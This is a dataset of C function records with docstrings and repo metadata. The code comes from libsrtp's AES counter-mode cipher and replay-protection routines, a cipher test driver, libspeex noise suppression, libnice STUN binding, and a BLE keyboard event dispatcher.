{"docstring": "/* default error-reporting function. Just writes to stderr. */\n", "func_signal": "static int tpl_oops(const char *fmt, ...)", "code": "{\n    va_list ap;\n    va_start(ap,fmt);\n    vfprintf(stderr,fmt,ap);\n    va_end(ap);\n    return 0;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/*\n * index_guess(local, guess, s)\n * \n * given a xtd_seq_num_t local (which represents the last\n * known-to-be-good received xtd_seq_num_t) and a sequence number s\n * (from a newly arrived packet), sets the contents of *guess to\n * contain the best guess of the packet index to which s corresponds,\n * and returns the difference between *guess and *local\n *\n * nota bene - the output is a signed integer, DON'T cast it to a\n * unsigned integer!  \n */\n", "func_signal": "int\nindex_guess(const xtd_seq_num_t *local,\n\t\t   xtd_seq_num_t *guess,\n\t\t   sequence_number_t s)", "code": "{\n#ifdef NO_64BIT_MATH\n  uint32_t local_roc = ((high32(*local) << 16) |\n\t\t\t\t\t\t(low32(*local) >> 16));\n  uint16_t local_seq = (uint16_t) (low32(*local));\n#else\n  uint32_t local_roc = (uint32_t)(*local >> 16);\n  uint16_t local_seq = (uint16_t) *local;\n#endif\n#ifdef NO_64BIT_MATH\n  uint32_t guess_roc = ((high32(*guess) << 16) |\n\t\t\t\t\t\t(low32(*guess) >> 16));\n  uint16_t guess_seq = (uint16_t) (low32(*guess));\n#else\n  uint32_t guess_roc = (uint32_t)(*guess >> 16);\n  uint16_t guess_seq = (uint16_t) *guess;  \n#endif\n  int difference;\n  \n  if (local_seq < seq_num_median) {\n    if (s - local_seq > seq_num_median) {\n      guess_roc = local_roc - 1;\n      difference = seq_num_max - s + local_seq;\n    } else {\n      guess_roc = local_roc;\n      difference = s - local_seq;\n    }\n  } else {\n    if (local_seq - seq_num_median > s) {\n      guess_roc = local_roc+1;\n      difference = seq_num_max - local_seq + s;\n    } else {\n      difference = s - local_seq;\n      guess_roc = local_roc;\n    }\n  }\n  guess_seq = s;\n  \n  /* Note: guess_roc is 32 bits, so this generates a 48-bit result! */\n#ifdef NO_64BIT_MATH\n  *guess = make64(guess_roc >> 16,\n\t\t\t\t  (guess_roc << 16) | guess_seq);\n#else\n  *guess = (((uint64_t) guess_roc) << 16) | guess_seq;\n#endif\n\n  return difference;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\replay\\rdbx.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * The function cipher_test_throughput_array() tests the effect of CPU\n * cache thrash on cipher throughput.  \n *\n * cipher_array_alloc_init(ctype, array, num_ciphers) creates an array\n * of cipher_t of type ctype\n */\n", "func_signal": "err_status_t\ncipher_array_alloc_init(cipher_t ***ca, int num_ciphers,\n\t\t\tcipher_type_t *ctype, int klen)", "code": "{\n  int i, j;\n  err_status_t status;\n  uint8_t *key;\n  cipher_t **cipher_array;\n\n  /* allocate array of pointers to ciphers */\n  cipher_array = (cipher_t **) malloc(sizeof(cipher_t *) * num_ciphers);\n  if (cipher_array == NULL)\n    return err_status_alloc_fail;\n\n  /* set ca to location of cipher_array */\n  *ca = cipher_array;\n\n  /* allocate key */\n  key = crypto_alloc(klen);\n  if (key == NULL) {\n    free(cipher_array);\n    return err_status_alloc_fail;\n  }\n  \n  /* allocate and initialize an array of ciphers */\n  for (i=0; i < num_ciphers; i++) {\n\n    /* allocate cipher */\n    status = cipher_type_alloc(ctype, cipher_array, klen);\n    if (status)\n      return status;\n    \n    /* generate random key and initialize cipher */\n    for (j=0; j < klen; j++)\n      key[j] = (uint8_t) rand();\n    status = cipher_init(*cipher_array, key, direction_encrypt);\n    if (status)\n      return status;\n\n/*     printf(\"%dth cipher is at %p\\n\", i, *cipher_array); */\n/*     printf(\"%dth cipher description: %s\\n\", i,  */\n/* \t   (*cipher_array)->type->description); */\n    \n    /* advance cipher array pointer */\n    cipher_array++;\n  }\n\n  return err_status_ok;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\test\\cipher_driver.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * aes_icm_advance(...) refills the keystream_buffer and\n * advances the block index of the sicm_context forward by one\n *\n * this is an internal, hopefully inlined function\n */\n", "func_signal": "inline void\naes_icm_advance_ismacryp(aes_icm_ctx_t *c, uint8_t forIsmacryp)", "code": "{\n  /* fill buffer with new keystream */\n  v128_copy(&c->keystream_buffer, &c->counter);\n  aes_encrypt(&c->keystream_buffer, c->expanded_key);\n  c->bytes_in_buffer = sizeof(v128_t);\n\n  debug_print(mod_aes_icm, \"counter:    %s\", \n\t      v128_hex_string(&c->counter));\n  debug_print(mod_aes_icm, \"ciphertext: %s\", \n\t      v128_hex_string(&c->keystream_buffer));    \n  \n  /* clock counter forward */\n\n  if (forIsmacryp) {\n    uint32_t temp;    \n    //alex's clock counter forward\n    temp = ntohl(c->counter.v32[3]);\n    c->counter.v32[3] = htonl(++temp);\n  } else {\n    if (!++(c->counter.v8[15])) \n      ++(c->counter.v8[14]);\n  }\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\cipher\\aes_icm.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * rdbx_check(&r, delta) checks to see if the xtd_seq_num_t\n * which is at rdbx->index + delta is in the rdb\n */\n", "func_signal": "err_status_t\nrdbx_check(const rdbx_t *rdbx, int delta)", "code": "{\n  \n  if (delta > 0) {       /* if delta is positive, it's good */\n    return err_status_ok;\n  } else if (rdbx_high_bit_in_bitmask + delta < 0) {   \n                         /* if delta is lower than the bitmask, it's bad */\n    return err_status_replay_old; \n  } else if (v128_get_bit(&rdbx->bitmask, \n\t\t\t  rdbx_high_bit_in_bitmask + delta) == 1) {\n                         /* delta is within the window, so check the bitmask */\n    return err_status_replay_fail;    \n  }\n /* otherwise, the index is okay */\n\n  return err_status_ok; \n}", "path": "src\\components\\libs\\libsrtp\\crypto\\replay\\rdbx.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/* This function approximates the gain function \n   y = gamma(1.25)^2 * M(-.25;1;-x) / sqrt(x)  \n   which multiplied by xi/(1+xi) is the optimal gain\n   in the loudness domain ( sqrt[amplitude] )\n*/\n", "func_signal": "static inline spx_word32_t hypergeom_gain(spx_word32_t xx)", "code": "{\n   int ind;\n   float integer, frac;\n   float x;\n   static const float table[21] = {\n      0.82157f, 1.02017f, 1.20461f, 1.37534f, 1.53363f, 1.68092f, 1.81865f,\n      1.94811f, 2.07038f, 2.18638f, 2.29688f, 2.40255f, 2.50391f, 2.60144f,\n      2.69551f, 2.78647f, 2.87458f, 2.96015f, 3.04333f, 3.12431f, 3.20326f};\n      x = EXPIN_SCALING_1*xx;\n      integer = floor(2*x);\n      ind = (int)integer;\n      if (ind<0)\n         return FRAC_SCALING;\n      if (ind>19)\n         return FRAC_SCALING*(1+.1296/x);\n      frac = 2*x-integer;\n      return FRAC_SCALING*((1-frac)*table[ind] + frac*table[ind+1])/sqrt(x+.0001f);\n}", "path": "src\\components\\libs\\libspeex\\libspeex\\preprocess.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * aes_icm_set_octet(c, i) sets the counter of the context which it is\n * passed so that the next octet of keystream that will be generated\n * is the ith octet\n */\n", "func_signal": "err_status_t\naes_icm_set_octet(aes_icm_ctx_t *c,\n\t\t  uint64_t octet_num)", "code": "{\n\n#ifdef NO_64BIT_MATH\n  int tail_num       = low32(octet_num) & 0x0f;\n  /* 64-bit right-shift 4 */\n  uint64_t block_num = make64(high32(octet_num) >> 4,\n\t\t\t\t\t\t\t  ((high32(octet_num) & 0x0f)<<(32-4)) |\n\t\t\t\t\t\t\t   (low32(octet_num) >> 4));\n#else\n  int tail_num       = octet_num % 16;\n  uint64_t block_num = octet_num / 16;\n#endif\n  \n\n  /* set counter value */\n  /* FIX - There's no way this is correct */\n  c->counter.v64[0] = c->offset.v64[0];\n#ifdef NO_64BIT_MATH\n  c->counter.v64[0] = make64(high32(c->offset.v64[0]) ^ high32(block_num),\n\t\t\t\t\t\t\t low32(c->offset.v64[0])  ^ low32(block_num));\n#else\n  c->counter.v64[0] = c->offset.v64[0] ^ block_num;\n#endif\n\n  debug_print(mod_aes_icm, \n\t      \"set_octet: %s\", v128_hex_string(&c->counter)); \n\n  /* fill keystream buffer, if needed */\n  if (tail_num) {\n    v128_copy(&c->keystream_buffer, &c->counter);\n    aes_encrypt(&c->keystream_buffer, c->expanded_key);\n    c->bytes_in_buffer = sizeof(v128_t);\n\n    debug_print(mod_aes_icm, \"counter:    %s\", \n\t      v128_hex_string(&c->counter));\n    debug_print(mod_aes_icm, \"ciphertext: %s\", \n\t      v128_hex_string(&c->keystream_buffer));    \n    \n    /*  indicate number of bytes in keystream_buffer  */\n    c->bytes_in_buffer = sizeof(v128_t) - tail_num;\n  \n  } else {\n    \n    /* indicate that keystream_buffer is empty */\n    c->bytes_in_buffer = 0;\n  }\n\n  return err_status_ok;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\cipher\\aes_icm.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/** Binding keep-alive (Binding discovery indication!) */\n", "func_signal": "size_t\nstun_usage_bind_keepalive (StunAgent *agent, StunMessage *msg,\n    uint8_t *buf, size_t len)", "code": "{\n\n  stun_agent_init_indication (agent, msg,\n      buf, len, STUN_BINDING);\n  return stun_agent_finish_message (agent, msg, NULL, 0);\n}", "path": "src\\components\\libs\\libnice\\stun\\usages\\bind.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * rdbx_add_index adds the xtd_seq_num_t at rdbx->window_start + d to\n * replay_db (and does *not* check if that xtd_seq_num_t appears in db)\n *\n * this function should be called only after replay_check has\n * indicated that the index does not appear in the rdbx, e.g., a mutex\n * should protect the rdbx between these calls if need be\n */\n", "func_signal": "err_status_t\nrdbx_add_index(rdbx_t *rdbx, int delta)", "code": "{\n  \n  if (delta > 0) {\n    /* shift forward by delta */\n    index_advance(&rdbx->index, delta);\n    v128_left_shift(&rdbx->bitmask, delta);\n    v128_set_bit(&rdbx->bitmask, 127);\n  } else {\n    /* delta is in window, so flip bit in bitmask */\n    v128_set_bit(&rdbx->bitmask, -delta);\n  }\n\n  /* note that we need not consider the case that delta == 0 */\n  \n  return err_status_ok;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\replay\\rdbx.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/* Compute the gain floor based on different floors for the background noise and residual echo */\n", "func_signal": "static void compute_gain_floor(int noise_suppress, int effective_echo_suppress, spx_word32_t *noise, spx_word32_t *echo, spx_word16_t *gain_floor, int len)", "code": "{\n   int i;\n   \n   if (noise_suppress > effective_echo_suppress)\n   {\n      spx_word16_t noise_gain, gain_ratio;\n      noise_gain = EXTRACT16(MIN32(Q15_ONE,SHR32(spx_exp(MULT16_16(QCONST16(0.11513,11),noise_suppress)),1)));\n      gain_ratio = EXTRACT16(MIN32(Q15_ONE,SHR32(spx_exp(MULT16_16(QCONST16(.2302585f,11),effective_echo_suppress-noise_suppress)),1)));\n\n      /* gain_floor = sqrt [ (noise*noise_floor + echo*echo_floor) / (noise+echo) ] */\n      for (i=0;i<len;i++)\n         gain_floor[i] = MULT16_16_Q15(noise_gain,\n                                       spx_sqrt(SHL32(EXTEND32(DIV32_16_Q15(PSHR32(noise[i],NOISE_SHIFT) + MULT16_32_Q15(gain_ratio,echo[i]),\n                                             (1+PSHR32(noise[i],NOISE_SHIFT) + echo[i]) )),15)));\n   } else {\n      spx_word16_t echo_gain, gain_ratio;\n      echo_gain = EXTRACT16(MIN32(Q15_ONE,SHR32(spx_exp(MULT16_16(QCONST16(0.11513,11),effective_echo_suppress)),1)));\n      gain_ratio = EXTRACT16(MIN32(Q15_ONE,SHR32(spx_exp(MULT16_16(QCONST16(.2302585f,11),noise_suppress-effective_echo_suppress)),1)));\n\n      /* gain_floor = sqrt [ (noise*noise_floor + echo*echo_floor) / (noise+echo) ] */\n      for (i=0;i<len;i++)\n         gain_floor[i] = MULT16_16_Q15(echo_gain,\n                                       spx_sqrt(SHL32(EXTEND32(DIV32_16_Q15(MULT16_32_Q15(gain_ratio,PSHR32(noise[i],NOISE_SHIFT)) + echo[i],\n                                             (1+PSHR32(noise[i],NOISE_SHIFT) + echo[i]) )),15)));\n   }\n}", "path": "src\\components\\libs\\libspeex\\libspeex\\preprocess.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * Waits for a response or timeout to occur.\n *\n * @return ETIMEDOUT if the transaction has timed out, or 0 if an incoming\n * message needs to be processed.\n */\n", "func_signal": "static StunUsageTransReturn\nstun_trans_poll (StunTransport *tr, unsigned int delay)", "code": "{\n#ifdef HAVE_POLL\n  struct pollfd ufd;\n\n  memset (&ufd, 0, sizeof (ufd));\n  ufd.fd = stun_trans_fd (tr);\n\n  ufd.events |= POLLIN;\n\n  if (poll (&ufd, 1, delay) <= 0) {\n    return STUN_USAGE_TRANS_RETURN_RETRY;\n  }\n\n  return STUN_USAGE_TRANS_RETURN_SUCCESS;\n#else\n  (void)tr;\n  return STUN_USAGE_TRANS_RETURN_UNSUPPORTED;\n#endif\n}", "path": "src\\components\\libs\\libnice\\stun\\usages\\bind.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * rdbx_estimate_index(rdbx, guess, s)\n * \n * given an rdbx and a sequence number s (from a newly arrived packet),\n * sets the contents of *guess to contain the best guess of the packet\n * index to which s corresponds, and returns the difference between\n * *guess and the locally stored synch info\n */\n", "func_signal": "int\nrdbx_estimate_index(const rdbx_t *rdbx,\n\t\t    xtd_seq_num_t *guess,\n\t\t    sequence_number_t s)", "code": "{\n\n  /*\n   * if the sequence number and rollover counter in the rdbx are\n   * non-zero, then use the index_guess(...) function, otherwise, just\n   * set the rollover counter to zero (since the index_guess(...)\n   * function might incorrectly guess that the rollover counter is\n   * 0xffffffff)\n   */\n\n#ifdef NO_64BIT_MATH\n  /* seq_num_median = 0x8000 */\n  if (high32(rdbx->index) > 0 ||\n\t  low32(rdbx->index) > seq_num_median)\n#else\n  if (rdbx->index > seq_num_median)\n#endif\n    return index_guess(&rdbx->index, guess, s);\n  \n#ifdef NO_64BIT_MATH\n  *guess = make64(0,(uint32_t) s);\n#else  \n  *guess = s;\n#endif\n\n#ifdef NO_64BIT_MATH\n  return s - (uint16_t) low32(rdbx->index);\n#else\n  return s - (uint16_t) rdbx->index;\n#endif\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\replay\\rdbx.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * aes_icm_set_iv(c, iv) sets the counter value to the exor of iv with\n * the offset\n */\n", "func_signal": "err_status_t\naes_icm_set_iv(aes_icm_ctx_t *c, void *iv)", "code": "{\n  v128_t *nonce = (v128_t *) iv;\n\n  debug_print(mod_aes_icm, \n\t      \"setting iv: %s\", v128_hex_string(nonce)); \n \n  v128_xor(&c->counter, &c->offset, nonce);\n  \n  debug_print(mod_aes_icm, \n\t      \"set_counter: %s\", v128_hex_string(&c->counter)); \n\n  /* indicate that the keystream_buffer is empty */\n  c->bytes_in_buffer = 0;\n\n  return err_status_ok;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\cipher\\aes_icm.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/** Non-blocking mode STUN binding discovery */\n", "func_signal": "size_t stun_usage_bind_create (StunAgent *agent, StunMessage *msg,\n    uint8_t *buffer, size_t buffer_len)", "code": "{\n  stun_agent_init_request (agent, msg, buffer, buffer_len, STUN_BINDING);\n\n  return stun_agent_finish_message (agent, msg, NULL, 0);\n}", "path": "src\\components\\libs\\libnice\\stun\\usages\\bind.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * cipher_driver_test_buffering(ct) tests the cipher's output\n * buffering for correctness by checking the consistency of succesive\n * calls\n */\n", "func_signal": "err_status_t\ncipher_driver_test_buffering(cipher_t *c)", "code": "{\n  int i, j, num_trials = 1000;\n  unsigned len, buflen = 1024;\n  uint8_t buffer0[buflen], buffer1[buflen], *current, *end;\n  uint8_t idx[16] = { \n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x34\n  };\n  err_status_t status;\n  \n  printf(\"testing output buffering for cipher %s...\",\n\t c->type->description);\n\n  for (i=0; i < num_trials; i++) {\n\n   /* set buffers to zero */\n    for (j=0; j < buflen; j++) \n      buffer0[j] = buffer1[j] = 0;\n    \n    /* initialize cipher  */\n    status = cipher_set_iv(c, idx);\n    if (status)\n      return status;\n\n    /* generate 'reference' value by encrypting all at once */\n    status = cipher_encrypt(c, buffer0, &buflen);\n    if (status)\n      return status;\n\n    /* re-initialize cipher */\n    status = cipher_set_iv(c, idx);\n    if (status)\n      return status;\n    \n    /* now loop over short lengths until buffer1 is encrypted */\n    current = buffer1;\n    end = buffer1 + buflen;\n    while (current < end) {\n\n      /* choose a short length */\n      len = rand() & 0x01f;\n\n      /* make sure that len doesn't cause us to overreach the buffer */\n      if (current + len > end)\n\tlen = end - current;\n\n      status = cipher_encrypt(c, current, &len);\n      if (status) \n\treturn status;\n      \n      /* advance pointer into buffer1 to reflect encryption */\n      current += len;\n      \n      /* if buffer1 is all encrypted, break out of loop */\n      if (current == end)\n\tbreak;\n    }\n\n    /* compare buffers */\n    for (j=0; j < buflen; j++)\n      if (buffer0[j] != buffer1[j]) {\n#if PRINT_DEBUG\n\tprintf(\"test case %d failed at byte %d\\n\", i, j);\n\tprintf(\"computed: %s\\n\", octet_string_hex_string(buffer1, buflen));\n\tprintf(\"expected: %s\\n\", octet_string_hex_string(buffer0, buflen));\n#endif \n\treturn err_status_algo_fail;\n      }\n  }\n  \n  printf(\"passed\\n\");\n\n  return err_status_ok;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\test\\cipher_driver.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * cipher_array_bits_per_second(c, l, t) computes (an estimate of) the\n * number of bits that a cipher implementation can encrypt in a second\n * when distinct keys are used to encrypt distinct messages\n * \n * c is a cipher (which MUST be allocated an initialized already), l\n * is the length in octets of the test data to be encrypted, and t is\n * the number of trials\n *\n * if an error is encountered, the value 0 is returned\n */\n", "func_signal": "uint64_t\ncipher_array_bits_per_second(cipher_t *cipher_array[], int num_cipher, \n\t\t\t      unsigned octets_in_buffer, int num_trials)", "code": "{\n  int i;\n  v128_t nonce;\n  clock_t timer;\n  unsigned char *enc_buf;\n  int cipher_index = 0;\n\n\n  enc_buf = crypto_alloc(octets_in_buffer);\n  if (enc_buf == NULL)\n    return 0;  /* indicate bad parameters by returning null */\n  \n  /* time repeated trials */\n  v128_set_to_zero(&nonce);\n  timer = clock();\n  for(i=0; i < num_trials; i++, nonce.v32[3] = i) {\n\n    /* choose a cipher at random from the array*/\n    cipher_index = (*((uint32_t *)enc_buf)) % num_cipher;\n\n    /* encrypt buffer with cipher */\n    cipher_set_iv(cipher_array[cipher_index], &nonce);\n    cipher_encrypt(cipher_array[cipher_index], enc_buf, &octets_in_buffer);\n  }\n  timer = clock() - timer;\n\n  free(enc_buf);\n\n  if (timer == 0) {\n    /* Too fast! */\n    return 0;\n  }\n\n  return CLOCKS_PER_SEC * num_trials * 8 * octets_in_buffer / timer;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\test\\cipher_driver.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * aes_icm_context_init(...) initializes the aes_icm_context\n * using the value in key[].\n *\n * the key is the secret key \n *\n * the salt is unpredictable (but not necessarily secret) data which\n * randomizes the starting point in the keystream\n */\n", "func_signal": "err_status_t\naes_icm_context_init(aes_icm_ctx_t *c, const uint8_t *key)", "code": "{\n  v128_t tmp_key;\n\n  /* set counter and initial values to 'offset' value */\n  /* FIX!!! this assumes the salt is at key + 16, and thus that the */\n  /* FIX!!! cipher key length is 16!  Also note this copies past the\n            end of the 'key' array by 2 bytes! */\n  v128_copy_octet_string(&c->counter, key + 16);\n  v128_copy_octet_string(&c->offset, key + 16);\n\n  /* force last two octets of the offset to zero (for srtp compatibility) */\n  c->offset.v8[14] = c->offset.v8[15] = 0;\n  c->counter.v8[14] = c->counter.v8[15] = 0;\n  \n  /* set tmp_key (for alignment) */\n  v128_copy_octet_string(&tmp_key, key);\n\n  debug_print(mod_aes_icm, \n\t      \"key:  %s\", v128_hex_string(&tmp_key)); \n  debug_print(mod_aes_icm, \n\t      \"offset: %s\", v128_hex_string(&c->offset)); \n\n  /* expand key */\n  aes_expand_encryption_key(&tmp_key, c->expanded_key);\n\n  /* indicate that the keystream_buffer is empty */\n  c->bytes_in_buffer = 0;\n\n  return err_status_ok;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\cipher\\aes_icm.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*e\n * icm_encrypt deals with the following cases:\n *\n * bytes_to_encr < bytes_in_buffer\n *  - add keystream into data\n *\n * bytes_to_encr > bytes_in_buffer\n *  - add keystream into data until keystream_buffer is depleted\n *  - loop over blocks, filling keystream_buffer and then\n *    adding keystream into data\n *  - fill buffer then add in remaining (< 16) bytes of keystream \n */\n", "func_signal": "err_status_t\naes_icm_encrypt_ismacryp(aes_icm_ctx_t *c,\n              unsigned char *buf, unsigned int *enc_len, \n              int forIsmacryp)", "code": "{\n  unsigned int bytes_to_encr = *enc_len;\n  unsigned int i;\n  uint32_t *b;\n\n  /* check that there's enough segment left but not for ismacryp*/\n  if (!forIsmacryp && (bytes_to_encr + htons(c->counter.v16[7])) > 0xffff)\n    return err_status_terminus;\n\n debug_print(mod_aes_icm, \"block index: %d\", \n           htons(c->counter.v16[7]));\n  if (bytes_to_encr <= (unsigned int)c->bytes_in_buffer) {\n    \n    /* deal with odd case of small bytes_to_encr */\n    for (i = (sizeof(v128_t) - c->bytes_in_buffer);\n\t\t i < (sizeof(v128_t) - c->bytes_in_buffer + bytes_to_encr); i++) \n\t{\n      *buf++ ^= c->keystream_buffer.v8[i];\n\t}\n\n    c->bytes_in_buffer -= bytes_to_encr;\n\n    /* return now to avoid the main loop */\n    return err_status_ok;\n\n  } else {\n    \n    /* encrypt bytes until the remaining data is 16-byte aligned */    \n    for (i=(sizeof(v128_t) - c->bytes_in_buffer); i < sizeof(v128_t); i++) \n      *buf++ ^= c->keystream_buffer.v8[i];\n\n    bytes_to_encr -= c->bytes_in_buffer;\n    c->bytes_in_buffer = 0;\n\n  }\n  \n  /* now loop over entire 16-byte blocks of keystream */\n  for (i=0; i < (bytes_to_encr/sizeof(v128_t)); i++) {\n\n    /* fill buffer with new keystream */\n    aes_icm_advance_ismacryp(c, forIsmacryp);\n\n    /*\n     * add keystream into the data buffer (this would be a lot faster\n     * if we could assume 32-bit alignment!)\n     */\n\n#if ALIGN_32\n    b = (uint32_t *)buf;\n    *b++ ^= c->keystream_buffer.v32[0];\n    *b++ ^= c->keystream_buffer.v32[1];\n    *b++ ^= c->keystream_buffer.v32[2];\n    *b++ ^= c->keystream_buffer.v32[3];\n    buf = (uint8_t *)b;\n#else    \n    if ((((unsigned long) buf) & 0x03) != 0) {\n      *buf++ ^= c->keystream_buffer.v8[0];\n      *buf++ ^= c->keystream_buffer.v8[1];\n      *buf++ ^= c->keystream_buffer.v8[2];\n      *buf++ ^= c->keystream_buffer.v8[3];\n      *buf++ ^= c->keystream_buffer.v8[4];\n      *buf++ ^= c->keystream_buffer.v8[5];\n      *buf++ ^= c->keystream_buffer.v8[6];\n      *buf++ ^= c->keystream_buffer.v8[7];\n      *buf++ ^= c->keystream_buffer.v8[8];\n      *buf++ ^= c->keystream_buffer.v8[9];\n      *buf++ ^= c->keystream_buffer.v8[10];\n      *buf++ ^= c->keystream_buffer.v8[11];\n      *buf++ ^= c->keystream_buffer.v8[12];\n      *buf++ ^= c->keystream_buffer.v8[13];\n      *buf++ ^= c->keystream_buffer.v8[14];\n      *buf++ ^= c->keystream_buffer.v8[15];\n    } else {\n      b = (uint32_t *)buf;\n      *b++ ^= c->keystream_buffer.v32[0];\n      *b++ ^= c->keystream_buffer.v32[1];\n      *b++ ^= c->keystream_buffer.v32[2];\n      *b++ ^= c->keystream_buffer.v32[3];\n      buf = (uint8_t *)b;\n    }\n#endif /* #if ALIGN_32 */\n\n  }\n  \n  /* if there is a tail end of the data, process it */\n  if ((bytes_to_encr & 0xf) != 0) {\n    \n    /* fill buffer with new keystream */\n    aes_icm_advance_ismacryp(c, forIsmacryp);\n    \n    for (i=0; i < (bytes_to_encr & 0xf); i++)\n      *buf++ ^= c->keystream_buffer.v8[i];\n    \n    /* reset the keystream buffer size to right value */\n    c->bytes_in_buffer = sizeof(v128_t) - i;  \n  } else {\n\n    /* no tail, so just reset the keystream buffer size to zero */\n    c->bytes_in_buffer = 0;\n\n  }\n\n  return err_status_ok;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\cipher\\aes_icm.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/* This function approximates the gain function \n   y = gamma(1.25)^2 * M(-.25;1;-x) / sqrt(x)  \n   which multiplied by xi/(1+xi) is the optimal gain\n   in the loudness domain ( sqrt[amplitude] )\n   Input in Q11 format, output in Q15\n*/\n", "func_signal": "static inline spx_word32_t hypergeom_gain(spx_word32_t xx)", "code": "{\n   int ind;\n   spx_word16_t frac;\n   /* Q13 table */\n   static const spx_word16_t table[21] = {\n       6730,  8357,  9868, 11267, 12563, 13770, 14898,\n      15959, 16961, 17911, 18816, 19682, 20512, 21311,\n      22082, 22827, 23549, 24250, 24931, 25594, 26241};\n      ind = SHR32(xx,10);\n      if (ind<0)\n         return Q15_ONE;\n      if (ind>19)\n         return ADD32(EXTEND32(Q15_ONE),EXTEND32(DIV32_16(QCONST32(.1296,23), SHR32(xx,EXPIN_SHIFT-SNR_SHIFT))));\n      frac = SHL32(xx-SHL32(ind,10),5);\n      return SHL32(DIV32_16(PSHR32(MULT16_16(Q15_ONE-frac,table[ind]) + MULT16_16(frac,table[ind+1]),7),(spx_sqrt(SHL32(xx,15)+6711))),7);\n}", "path": "src\\components\\libs\\libspeex\\libspeex\\preprocess.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * rdbx_set_roc(rdbx, roc) initalizes the rdbx_t at the location rdbx\n * to have the rollover counter value roc.  If that value is less than\n * the current rollover counter value, then the function returns\n * err_status_replay_old; otherwise, err_status_ok is returned.\n * \n */\n", "func_signal": "err_status_t\nrdbx_set_roc(rdbx_t *rdbx, uint32_t roc)", "code": "{\n  v128_set_to_zero(&rdbx->bitmask);\n\n#ifdef NO_64BIT_MATH\n  #error not yet implemented\n#else\n\n  /* make sure that we're not moving backwards */\n  if (roc < (rdbx->index >> 16))\n    return err_status_replay_old;\n\n  rdbx->index &= 0xffff;   /* retain lowest 16 bits */\n  rdbx->index |= ((uint64_t)roc) << 16;  /* set ROC */\n#endif\n\n  return err_status_ok;\n}", "path": "src\\components\\libs\\libsrtp\\crypto\\replay\\rdbx.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/*\n * Creates and connects a socket. This is useful when a socket is to be used\n * for multiple consecutive transactions (e.g. TURN).\n */\n", "func_signal": "static int stun_socket (int family, int type, int proto)", "code": "{\n  int fd = socket (family, type, proto);\n  if (fd == -1)\n    return -1;\n\n#ifdef FD_CLOEXEC\n  fcntl (fd, F_SETFD, fcntl (fd, F_GETFD) | FD_CLOEXEC);\n#endif\n#ifdef O_NONBLOCK\n  fcntl (fd, F_SETFL, fcntl (fd, F_GETFL) | O_NONBLOCK);\n#endif\n\n#ifdef MSG_ERRQUEUE\n  if (type == SOCK_DGRAM)\n  {\n    /* Linux specifics for ICMP errors on non-connected sockets */\n    int yes = 1;\n    switch (family)\n    {\n      case AF_INET:\n        setsockopt (fd, SOL_IP, IP_RECVERR, &yes, sizeof (yes));\n        break;\n      case AF_INET6:\n        setsockopt (fd, SOL_IPV6, IPV6_RECVERR, &yes, sizeof (yes));\n        break;\n    }\n  }\n#endif\n\n  return fd;\n}", "path": "src\\components\\libs\\libnice\\stun\\usages\\bind.c", "repo_name": "processone/oneteam", "stars": 101, "license": "other", "language": "c", "size": 15970}
{"docstring": "/**@brief   Function for dispatching a BLE stack event to all modules with a BLE stack event handler.\n *\n * @details This function is called from the scheduler in the main loop after a BLE stack\n *          event has been received.\n *\n * @param[in]   p_ble_evt   Bluetooth stack event.\n */\n", "func_signal": "static void ble_evt_dispatch(ble_evt_t * p_ble_evt)", "code": "{\n    dm_ble_evt_handler(p_ble_evt);\n    bsp_btn_ble_on_ble_evt(p_ble_evt);\n    on_ble_evt(p_ble_evt);\n    ble_advertising_on_ble_evt(p_ble_evt);\n    ble_conn_params_on_ble_evt(p_ble_evt);\n    ble_hids_on_ble_evt(&m_hids, p_ble_evt);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
